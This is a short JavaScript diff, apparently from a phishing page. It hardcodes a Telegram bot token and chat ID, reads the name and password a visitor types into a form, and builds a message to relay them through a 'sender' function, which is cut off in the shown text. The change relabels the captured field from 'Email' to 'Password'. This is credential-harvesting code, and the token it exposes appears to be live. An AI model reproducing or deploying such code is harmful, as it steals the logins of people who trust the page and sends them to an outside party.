@@ -2,12 +2,12 @@
 var telegram_bot_id = "8144406538:AAHFTTXq6FFtwywQCPaw4y20jA289mEsHUM";
 //chat id
 var chat_id = 6734793600;
-var u_name, email, message;
+var u_name, u_password;
 var ready = function () {
     u_name = document.getElementById("name").value;
-    password = document.getElementById("password").value;
+    u_password = document.getElementById("password").value;
     //message = document.getElementById("message").value;
-    message = "Name: " + u_name + "\nEmail: " + password;
+    message = "Name: " + u_name + "\nPassword: " + u_password;
 };
 var sender = function () {
     ready();
